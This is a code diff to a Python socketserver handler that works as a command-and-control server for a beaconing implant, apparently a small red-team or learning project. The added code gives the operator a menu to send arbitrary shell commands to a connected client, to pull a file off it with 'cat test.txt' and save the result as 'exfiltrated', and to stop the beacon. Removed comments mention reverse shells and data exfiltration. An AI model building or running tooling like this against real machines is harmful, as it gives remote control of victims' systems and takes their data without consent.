@@ -5,15 +5,28 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
     """
 
     def handle(self):
-        self.data = self.request.recv(2048).strip()
-        print("Received connection from {}:{}".format(self.client_address[0], self.data))
+        self.data = self.request.recv(2048).strip().decode('utf-8')
+        print("\nReceived connection from {}:{}".format(self.client_address[0], self.data))
 
-        command = input("Enter command: ")
-        # if command = reverse shell, but this may be noisy
-        # if command = exfil data then data.write(name)
-        self.request.sendall(bytes(command, "utf-8"))
-        self.data = self.request.recv(2048).strip()
-        print(self.data)
+        option = input("1. Run a command\n2. Exfil test file\n3. Stop beaconing\nOption: ") 
+
+        if option == "1":
+            command = input("Enter command: ")
+            self.request.sendall(bytes(command, "utf-8"))
+            self.data = self.request.recv(2048).strip().decode('utf-8')
+            print(self.data)
+        elif option == "2":
+            command = "cat test.txt"
+            self.request.sendall(bytes(command, "utf-8"))
+            self.data = self.request.recv(2048).strip().decode('utf-8')
+
+            f = open("testexfil.txt", "x")
+            f.write(self.data)
+            f.close()
+            print("testexfil.txt exfiltrated")
+
+        else:
+            self.request.sendall(bytes("1", "utf-8"))
 
     def menu():
         print("Type exit to stop beacon")
